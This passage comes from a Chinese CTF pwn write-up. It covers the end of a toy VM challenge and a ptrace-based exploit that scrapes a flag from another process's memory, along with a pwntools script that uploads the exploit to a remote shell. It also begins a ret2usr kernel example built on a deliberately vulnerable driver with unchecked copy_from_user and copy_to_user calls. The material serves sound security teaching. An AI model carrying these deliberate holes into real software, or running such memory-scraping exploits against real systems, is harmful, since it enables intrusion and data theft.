vm_elf(exec);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(system_cmd[<span class="number">5</span>],tmp,<span class="built_in">strlen</span>(system_cmd[<span class="number">5</span>])))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;RDI:%lld RSI:%lld RDX:%lld RAX:%lld\n&quot;</span>,REG[RDI],REG[RSI],REG[RDX],REG[RAX]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(system_cmd[<span class="number">6</span>],tmp,<span class="built_in">strlen</span>(system_cmd[<span class="number">6</span>])))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span>(users.gid==<span class="number">0</span>&amp;&amp;users.uid==<span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        DEBUG();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(system_cmd[<span class="number">7</span>],tmp,<span class="built_in">strlen</span>(system_cmd[<span class="number">7</span>])))</span><br><span class="line">    &#123;</span><br><span class="line">      clearScreen();</span><br><span class="line">      boot();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(system_cmd[<span class="number">8</span>],tmp,<span class="built_in">strlen</span>(system_cmd[<span class="number">8</span>])))</span><br><span class="line">    &#123;</span><br><span class="line">      clearScreen();</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(system_cmd[<span class="number">9</span>],tmp,<span class="built_in">strlen</span>(system_cmd[<span class="number">9</span>])))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">char</span> *exec;</span><br><span class="line">         exec = strtok(tmp, <span class="string">&quot; &quot;</span>);</span><br><span class="line">         exec = strtok(<span class="literal">NULL</span>, <span class="string">&quot; &quot;</span>);</span><br><span class="line">         deleEnter(exec);</span><br><span class="line">         rm(exec);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">boot</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  write_banner();</span><br><span class="line">  login_system();</span><br><span class="line">  <span class="keyword">if</span>(login_if==<span class="number">1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    REG[RDI]=<span class="number">0</span>;</span><br><span class="line">    REG[RSI]=<span class="number">0</span>;</span><br><span class="line">    REG[RDX]=<span class="number">0</span>;</span><br><span class="line">    REG[RAX]=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> check=check_repeat_reboot(<span class="string">&quot;README&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!check)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">goto</span> start;</span><br><span class="line">    &#125;</span><br><span class="line">    HF[file_count].fd=global_fd;</span><br><span class="line">    HF[file_count].filename=<span class="string">&quot;README&quot;</span>;</span><br><span class="line">    HF[file_count].mod=<span class="number">1001</span>;</span><br><span class="line">    HF[file_count].file_content=<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">strncpy</span>(HF[file_count].file_content,<span class="string">&quot;Welcome my machine,you can use it to make some easy file or exec some file. Now let me show u an easy asm //open mov rdi,1;mov rsi,1001;call open 2; just like this u can open a file.\n&quot;</span>,<span class="number">0x1000</span>);</span><br><span class="line">    deleEnter(HF[file_count].file_content);</span><br><span class="line">    file_count++;</span><br><span class="line">    global_fd++;</span><br><span class="line"></span><br><span class="line">start:    machine_start();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  boot();</span><br><span class="line">  </span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="injection2-0💉"><a href="#injection2-0💉" class="headerlink" title="injection2.0💉"></a>injection2.0💉</h3><p>题目提供的init文件分析</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">echo &quot;INIT SCRIPT&quot;</span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">echo 0 | tee /proc/sys/kernel/yama/ptrace_scope</span><br><span class="line">chown 0:0 flag</span><br><span class="line">chmod 755 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line">echo -e &quot;Boot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds&quot;</span><br><span class="line">./target &gt;pso.file 2&gt;&amp;1 &amp;</span><br><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br><span class="line">#setsid /bin/cttyhack setuidgid 0 /bin/sh # 修改 uid gid 为 0 以提权 /bin/sh 至 root。</span><br><span class="line">poweroff -f # 设置 shell 退出后则关闭机器</span><br></pre></td></tr></table></figure>

<p>echo 0 | tee &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;yama&#x2F;ptrace_scope</p>
<p>.&#x2F;target &gt;pso.file 2&gt;&amp;1 &amp;</p>
<p>setsid &#x2F;bin&#x2F;cttyhack setuidgid 0 &#x2F;bin&#x2F;sh</p>
<p>这3句是关键，现在是root，然后开启了ptrace，并且把target程序挂到了后台</p>
<p>target</p>
<p>读取flag到栈上后就死循环输出helloworld</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">264</span>]; <span class="comment">// [rsp+10h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fd = open(<span class="string">&quot;./flag&quot;</span>, <span class="number">436</span>, envp);</span><br><span class="line">  read(fd, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  close(fd);</span><br><span class="line">  close(<span class="number">0</span>);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  close(<span class="number">2</span>);</span><br><span class="line">  system(<span class="string">&quot;rm flag&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;Hello World\n&quot;</span>, <span class="number">0xC</span>uLL);</span><br><span class="line">    sleep(<span class="number">2u</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用思路</p>
<p>root下可使用ptrace接口，直接利用ptrace搜索进程内存，ps -ef获取到进程的PID 再去&#x2F;proc&#x2F;pid&#x2F;maps获取到栈地址</p>
<p>利用ptrace获取栈内数据比对flag格式字符串，我本地测试用的flag格式就是flag{}</p>
<p>还有一个小细节，我的qemu里面放了so文件可以跑动态链接程序。</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="comment">//cat /proc/131/maps</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argv , <span class="type">char</span> **argc)</span>&#123;</span><br><span class="line"> </span><br><span class="line">  <span class="type">int</span> data ;</span><br><span class="line">  <span class="type">int</span> stat ;</span><br><span class="line">  <span class="type">int</span> pid = atoi(argc[<span class="number">1</span>]) ;</span><br><span class="line">  ptrace(PTRACE_ATTACH, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>) ;</span><br><span class="line">  wait(&amp;stat) ;    <span class="comment">// 如果不wait，马上进行下一个ptrace的PEEK操作会造成 no such process 错误</span></span><br><span class="line">  <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> addr = <span class="number">0</span> ;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%llx&quot;</span>,&amp;addr);</span><br><span class="line">  <span class="keyword">for</span> (; addr &lt; <span class="number">0x7ffffffff000</span>; ++addr)</span><br><span class="line">  &#123;</span><br><span class="line">    data = ptrace(PTRACE_PEEKDATA, pid, addr, <span class="literal">NULL</span>);    <span class="comment">// 一次读一个字节</span></span><br><span class="line">    <span class="keyword">if</span>(data==<span class="number">0x65636165</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;data = %x , addr = %llx\n&quot;</span> , data , addr) ;</span><br><span class="line">      <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> addr1=addr<span class="number">-1</span>;</span><br><span class="line">      <span class="type">char</span> data1;</span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)</span><br><span class="line">      &#123;</span><br><span class="line">        addr1+=<span class="number">1</span>;</span><br><span class="line">        data1 = ptrace(PTRACE_PEEKDATA, pid, addr1, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="comment">//write(1,data1,0x10);</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span> , data1) ;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  ptrace(PTRACE_DETACH, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="上传脚本"><a href="#上传脚本" class="headerlink" title="上传脚本"></a>上传脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./boot.sh&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;&quot;</span>,<span class="number">53408</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exec_cmd</span>(<span class="params">cmd</span>):</span><br><span class="line">    io.sendline(cmd)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;# &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">exp</span>):</span><br><span class="line">    p = log.progress(<span class="string">&quot;Upload&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./&quot;</span>+exp, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    encoded = base64.b64encode(data)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;# &quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encoded), <span class="number">600</span>):</span><br><span class="line">        p.status(<span class="string">&quot;%d / %d&quot;</span> % (i, <span class="built_in">len</span>(encoded)))</span><br><span class="line">        exec_cmd(<span class="string">&quot;echo \&quot;%s\&quot; &gt;&gt; /tmp/benc&quot;</span> % (encoded[i:i+<span class="number">600</span>]))</span><br><span class="line"></span><br><span class="line">    exec_cmd(<span class="string">&quot;cat /tmp/benc | base64 -d &gt; /tmp/exp&quot;</span>)</span><br><span class="line">    exec_cmd(<span class="string">&quot;chmod +x /tmp/exp&quot;</span>)</span><br><span class="line">upload(<span class="string">&#x27;infect&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="kernel-test-本次资源合集，包括源码，EXP，docker🧬"><a href="#kernel-test-本次资源合集，包括源码，EXP，docker🧬" class="headerlink" title="kernel-test 本次资源合集，包括源码，EXP，docker🧬"></a>kernel-test 本次资源合集，包括源码，EXP，docker🧬</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">链接：https://pan.baidu.com/s/1h7xSB1qJp5s3MsoOCWUDig?pwd=2v64 </span><br><span class="line">提取码：2v64 </span><br><span class="line">--来自百度网盘超级会员V4的分享</span><br></pre></td></tr></table></figure>

<h4 id="Ret2usr"><a href="#Ret2usr" class="headerlink" title="Ret2usr"></a>Ret2usr</h4><p>这种技术已经很老了而且很好防范开启smep直接寄了，但是真的很好用，方便，不用找gadget不用控制bp，sp寄存器</p>
<p>网上已经有了很多很多的官方阐述，我这里只做通俗理解。</p>
<h4 id="简易讲解"><a href="#简易讲解" class="headerlink" title="简易讲解"></a>简易讲解</h4><p>对于操作系统，我们都知道存在用户态和内核态，驱动挂载是在内核态里面跑汇编的，普通二进制程序是在用户态里跑的。</p>
<p>如果qemu没有开启kvm64，kvm64 +smep都可以在用户态代码空间去执行任意代码。通俗讲smep就是相当于平常题目的NX。</p>
<p>思路很简单，用户打开驱动，用交互模块去利用漏洞。比如溢出，用read泄露canary，write构造rop。</p>
<p>控制rip从内核态跳转到用户态，执行我们exp中写好了的提权函数。</p>
<p>其实不用把内核驱动看的多神秘，说白了本质上还是二进制文件，只是代码执行区段有区分，有不同的保护机制，堆栈上本质的特性不会变的。不过随着GCC和内核版本提高，很多gadget已经消失了，常见的rop手法和栈迁移手法基本上算是寄了</p>
<p>这里简单讲下自己出的这个例题</p>
<h4 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span>    <span class="comment">// included for all kernel modules</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span>    <span class="comment">// included for KERN_INFO</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span>      <span class="comment">// included for __init and __exit macros</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/scpi_protocol.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span>        <span class="comment">// file_operation is defined in this header</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/device.h&gt;</span></span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;HRP&quot;</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;An easy kernel attack!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span>      majorNumber;</span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span>   <span class="keyword">class</span>*  <span class="title">HRP_module_class</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span>   <span class="title">device</span>* <span class="title">HRP_module_device</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_NAME <span class="string">&quot;test&quot;</span>      <span class="comment">//define device name</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CLASS_NAME  <span class="string">&quot;HRP_module&quot;</span></span></span><br><span class="line"><span class="type">char</span> pwn[<span class="number">0x300</span>]=<span class="string">&quot;flag&#123;I_am_flag_!&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//函数原型</span></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">HRP_module_ioctl</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">HRP_init</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">HRP_exit</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">HRP_module_write</span> <span class="params">(<span class="keyword">struct</span> file *, <span class="type">const</span> <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">HRP_module_read</span> <span class="params">(<span class="keyword">struct</span> file *, <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">///linux/fs.h中的file_operations结构体列出了所有操作系统允许的对设备文件的操作。在我们的驱动中，需要将其中需要的函数进行实现。下面这个结构体就是向操作系统声明，那些规定好的操作在本模块里是由哪个函数实现的。例如下文就表示unlocked_ioctl是由本模块中的HRP_module_ioctl()函数实现的。</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">HRP_module_fo</span> =</span> &#123;</span><br><span class="line">        .owner = THIS_MODULE,</span><br><span class="line">        .unlocked_ioctl = HRP_module_ioctl,</span><br><span class="line">        .write=HRP_module_write,</span><br><span class="line">        .read=HRP_module_read,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//本模块ioctl回调函数的实现</span></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">HRP_module_write</span> <span class="params">(<span class="keyword">struct</span> file * file, <span class="type">const</span> <span class="type">char</span> __user * user, <span class="type">size_t</span> size, <span class="type">loff_t</span> * p)</span></span><br><span class="line">&#123;</span><br><span class="line">        </span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;USE MY write\n&quot;</span>);</span><br><span class="line">    copy_from_user(pwn,user, size);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">114514</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">HRP_module_read</span> <span class="params">(<span class="keyword">struct</span> file * file, <span class="type">char</span> __user * user , <span class="type">size_t</span> size, <span class="type">loff_t</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">char</span> this_buf[<span class="number">0x40</span>]=<span class="string">&quot;welcome to my house\n&quot;</span>;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;USE MY read\n&quot;</span>);</span><br><span class="line">    copy_to_user(user,&amp;this_buf[size],<span class="number">0x40</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">114514</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">HRP_module_ioctl</span><span class="params">(<span class="keyword">struct</span> file *file,        <span class="comment">/* ditto */</span></span></span><br><span class="line"><span class="params">                 <span class="type">unsigned</span> <span class="type">int</span> cmd,      <span class="comment">/* number and param for ioctl */</span></span></span><br><span class="line"><span class="params">                 <span class="type">unsigned</span> <span class="type">long</span> param)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">/* ioctl回调函数中一般都使用switch结构来处理不同的输入参数（cmd） */</span></span><br><span class="line">        <span class="keyword">switch</span>(cmd)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="type">char</span> leak[<span class="number">0x10</span>]=<span class="string">&quot;NONO!&quot;</span>;</span><br><span class="line">                printk(KERN_INFO <span class="string">&quot;[HRPModule:] NOTHING! %s\n&quot;</span>,leak);</span><br><span class="line">                 __asm__(</span><br><span class="line">                <span class="string">&quot;mov $0x100,%rcx;&quot;</span></span><br><span class="line">                <span class="string">&quot;mov $pwn,%rsi;&quot;</span></span><br><span class="line">                <span class="string">&quot;mov %rsp,%rdi;&quot;</span></span><br><span class="line">                <span class="string">&quot;xor %eax,%eax;&quot;</span></span><br><span class="line">                <span class="string">&quot;rep movsb;&quot;</span></span><br><span class="line">                );</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">                printk(KERN_INFO <span class="string">&quot;[HRPModule:] Unknown ioctl cmd!\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">HRP_init</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;[HRPModule:] Entering HRP module. \n&quot;</span>);</span><br><span class="line">        <span class="comment">// 在加载本模块时，首先向操作系统注册一个chrdev，也即字节设备，三个参数分别为：主设备号（填写0即为等待系统分配），设备名称以及file_operation的结构体。返回值为系统分配的主设备号。</span></span><br><span class="line">        majorNumber = register_chrdev(<span class="number">0</span>, DEVICE_NAME, &amp;HRP_module_fo);</span><br><span class="line">        <span class="keyword">if</span>(majorNumber &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                printk(KERN_INFO <span class="string">&quot;[HRPModule:] Failed to register a major number. \n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> majorNumber;</span><br><span class="line">        &#125;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;[HRPModule:] Successful to register a major number %d. \n&quot;</span>, majorNumber);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//接下来，注册设备类</span></span><br><span class="line">        HRP_module_class = class_create(THIS_MODULE, CLASS_NAME);</span><br><span class="line">        <span class="keyword">if</span>(IS_ERR(HRP_module_class))&#123;</span><br><span class="line">                unregister_chrdev(majorNumber, DEVICE_NAME);</span><br><span class="line">                printk(KERN_INFO <span class="string">&quot;[HRPModule:] Class device register failed!\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> PTR_ERR(HRP_module_class);</span><br><span class="line">        &#125;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;[HRPModule:] Class device register success!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//最后，使用device_create函数注册设备驱动</span></span><br><span class="line">        HRP_module_device = device_create(HRP_module_class, <span class="literal">NULL</span>, MKDEV(majorNumber, <span class="number">0</span>), <span class="literal">NULL</span>, DEVICE_NAME);</span><br><span class="line">        <span class="keyword">if</span> (IS_ERR(HRP_module_device))&#123;               <span class="comment">// Clean up if there is an error</span></span><br><span class="line">                class_destroy(HRP_module_class);           <span class="comment">// Repeated code but the alternative is goto statements</span></span><br><span class="line">                unregister_chrdev(majorNumber, DEVICE_NAME);</span><br><span class="line">                printk(KERN_ALERT <span class="string">&quot;Failed to create the device\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> 